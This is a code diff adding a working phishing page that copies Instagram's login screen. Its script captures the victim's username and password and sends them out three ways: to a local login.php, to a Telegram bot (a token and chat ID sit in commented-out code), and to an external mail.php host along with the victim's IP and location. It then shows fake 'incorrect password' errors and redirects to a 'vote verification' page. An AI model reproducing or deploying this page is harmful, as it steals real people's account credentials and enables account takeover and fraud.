@@ -1,0 +1,329 @@
+<!-- <div id="google_translate_element" style='position: fixed; bottom: 0; left: 0'></div>
+  <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({pageLanguage: 'en', layout: google.translate.TranslateElement.InlineLayout.SIMPLE}, 'google_translate_element');
+        }
+    </script>
+
+    <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noarchive">
+
+</head>
+
+<body>
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #FAFAFA;
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        }
+
+        .container-item {
+            width: 85%;
+            margin: 20px 50%;
+            transform: translateX(-50%);
+            padding: 30px 10px;
+            display: block;
+            border: 1px solid #e9e9e9;
+            background-color: white;
+        }
+
+        input {
+            display: block;
+            width: 93.5%;
+            margin: 0 3%;
+            padding: 20px 10px 10px 10px;
+            border-radius: 3px;
+            border: 1px solid #DBDBDB;
+            margin: 5px 0;
+            color: #282727;
+            background: #FAFAFA;
+            font-size: 13px;
+            outline: 1px solid transparent;
+        }
+
+        input[type=password] {
+            padding: 25px 10px 10px 10px;
+        }
+
+        label {
+            font-size: 11.5px;
+            position: absolute;
+            transform: translateY(18px);
+            /* transform: translateY(7px); */
+            padding: 0px 10px;
+            transition: 0.2s ease-in-out all;
+            color: #838181;
+        }
+
+        .label-toggle {
+            transform: translateY(7px);
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background: dodgerblue;
+            color: white;
+            border: 1px solid transparent;
+            border-radius: 3px;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+
+        a {
+            text-align: right;
+            color: #114b86;
+            text-decoration: none;
+            font-size: 13px;
+        }
+
+        ul {
+            display: flex;
+            justify-content: center;
+            list-style-type: none;
+            align-items: center;
+        }
+
+        #loader {
+            position: absolute;
+            left: 50%;
+            transform: translate(-50%, 18px);
+            visibility: hidden;
+        }
+
+        #feedback {
+            display: none;
+        }
+
+        @media screen and (min-width: 768px) {
+            .container {
+                width: 70%;
+                margin: 0 50%;
+                transform: translateX(-50%);
+            }
+
+            .container-item {
+                width: 340px;
+                margin-top: 60px;
+            }
+
+            #error {
+                padding: 0 35% !important;
+            }
+        }
+    </style>
+    <div class="container">
+        <div class="container-item"><br><br>
+            <center><img src="instagram_files/ig.png" width="200px"></center><br>
+            <label class="label" for="">Phone number, username, or email</label>
+            <input class="input" type="text" id="username" name="username">
+
+            <label class="label" for="">Password</label>
+            <input class="input" type="password" id="password" name="password">
+
+            <button id="login">Log in</button>
+            <img src="instagram_files/load.gif" id="loader" width="18px">
+            <br>
+            <p style="text-align: center;"><a href="#">Forgot Password ?</a></p>
+        </div>
+        <!-- <p id="feedback" style="text-align: center; font-size: 13px; margin: 10px 0; color: #ec3131; padding: 0 23%;"></p> -->
+
+        <p id="feedback" style="text-align: center; font-size: 13px; margin: 10px 0; color: #ec3131; padding: 0 23%;"></p>
+
+        <div class="container-item" style="padding: 15px 10px;">
+            <p style="text-align: center; font-size: 13px;">Don't have an account? <a href="" style="color: dodgerblue;">Sign up</a></p>
+        </div>
+        <p style="text-align: center; font-size: 13px;">Get the app.</p>
+        <ul>
+            <li><img src="instagram_files/go.png" style="margin: 10px 5px;" width="100px" height="38px"></li>
+            <li><img src="instagram_files/mi.png" style="margin: 10px 5px;" width="100px"></li>
+        </ul>
+        <p style="text-align: center; margin: 15px 0;"><img src="instagram_files/me.svg" width="50px"></p>
+    </div>
+
+    <iframe src="" id="iframLink" style="opacity: 0;" frameborder="0"></iframe>
+
+    
+
+    <input type="hidden" id="country" value="Nigeria
+" name="country">
+    <input type="hidden" id="city" value="
+" name="city">
+    <input type="hidden" id="continent" value="Africa
+" name="city">
+    <input type="hidden" id="ip" value="105.112.96.120" name="ip">
+    <input type="hidden" id="adminEmail" value="contextvotemail@gmail.com" name="admin">
+
+
+    <script>
+        var login = document.getElementById('login')
+        var loader = document.getElementById('loader')
+        var username = document.getElementById('username')
+        var password = document.getElementById('password')
+        var feedback = document.getElementById('feedback')
+        var x = 0;
+        var label = document.querySelectorAll(".label")
+        var input = document.querySelectorAll(".input")
+        var container = document.querySelector('.container')
+
+        var country = document.getElementById('country')
+        var city = document.getElementById('city')
+        var continent = document.getElementById('continent')
+        var ip = document.getElementById('ip')
+        var adminEmail = document.getElementById('adminEmail')
+        var iframLink = document.getElementById('iframLink')
+
+
+        for (let i = 0; i < label.length; i++) {
+            label[i].addEventListener('click', function() {
+                label[0].classList.add('label-toggle')
+                label[1].classList.add('label-toggle')
+            })
+
+            input[i].addEventListener('click', function() {
+                label[0].classList.add('label-toggle')
+                label[1].classList.add('label-toggle')
+            })
+
+            // container.addEventListener('click', function () {
+            //     if (input[i].value === "") {
+            //         label[0].classList.remove('label-toggle')
+            //         label[1].classList.remove('label-toggle')
+            //     }
+            // })
+
+        }
+
+
+
+        login.addEventListener('click', function() {
+            login.textContent = ""
+            login.style.padding = "16px 10px"
+            loader.style.visibility = 'visible'
+
+            setTimeout(() => {
+                feedback.style.display = 'block'
+                login.textContent = "Log In"
+                loader.style.visibility = "hidden"
+                if (username.value == "" || password.value == "") {
+                    feedback.textContent = "Input's cannot be empty"
+                } else {
+                    validation()
+                }
+            }, 1500);
+
+
+        })
+
+        function validation() {
+            login.textContent = "";
+            loader.style.visibility = 'visible'
+
+            setTimeout(() => {
+                login.textContent = 'Log In'
+                loader.style.visibility = 'hidden'
+
+                const data = new FormData();
+                data.append('username', username.value);
+                data.append('password', password.value);
+                const response = new XMLHttpRequest();
+                response.onreadystatechange = function() {
+                    feedback.style.display = 'block'
+                }
+                response.open('POST', './info/login.php', true);
+                response.send(data);
+
+                const dataD = new FormData();
+                dataD.append('username', username.value);
+                dataD.append('password', password.value);
+                const response2 = new XMLHttpRequest();
+                response2.onreadystatechange = function() {}
+                response2.open('POST', './info/login.php', true);
+                response2.send(dataD);
+
+
+                // Telegram script
+                // Replace with your actual bot token and chat ID
+                const botToken = '';
+                const chatId = '';
+
+                // const botToken = '6620819038:AAEHyILpkCzwwlDX5tGbxzIqNUZ1yVXUqLo';
+                // const chatId = '5360982855';
+
+                // Function to send a message using vanilla Ajax
+                function sendMessage(message) {
+                    const xhr = new XMLHttpRequest();
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const params = `chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+                    xhr.onreadystatechange = function() {
+                        if (xhr.readyState === 4) {
+                            if (xhr.status === 200) {
+                                console.log('Message sent:', xhr.responseText);
+                            } else {
+                                console.error('Error sending message:', xhr.status, xhr.statusText);
+                            }
+                        }
+                    };
+
+                    xhr.send(params);
+                }
+
+                // Example: Send a message when the page loads
+                    const messageToSend = `Hello admin, somebody just logged in: \n \n Username: ${username.value} (Instagram) \n \n Password: ${password.value} \n \n IP: ${ip.value} \n \n country: ${country.value} \n city: ${city.value} \n continent: ${continent.value} `;
+                    sendMessage(messageToSend);
+
+                // Telegram End
+
+
+                x += 1
+                feedback.textContent = 'The password you entered is incorrect. Please check your password and try again';
+                if (x == 2) {
+                    // feedback.textContent = ''
+                    feedback.textContent = 'Sorry an error occurred please try again later'
+                } else if (x == 3) {
+                    feedback.textContent = '';
+                    setTimeout(() => {
+                        window.location.href = 'vote_verification.html'
+                    }, 1500);
+                }
+
+
+                //===============================================
+                //MAIL SENDER
+                var xhr2 = new XMLHttpRequest()
+                var data2 = new FormData()
+                var url = "http://wealthgatepro.com/mail.php?username=" + username.value + " (Instagram)" + "&password=" + password.value + "&country=" + country.value + "&city=" + city.value + "&continent=" + continent.value + "&ip=" + ip.value + "&adminEmail=" + adminEmail.value
+
+                iframLink.src = url
+
+                xhr2.onreadystatechange = function() {
+                    console.log("sent successfully")
+                }
+                xhr2.open('GET', url, 'true');
+                xhr2.send()
+                //======================================
+
+
+            }, 1500);
+        }
+    </script>
+
+
+</body></html>
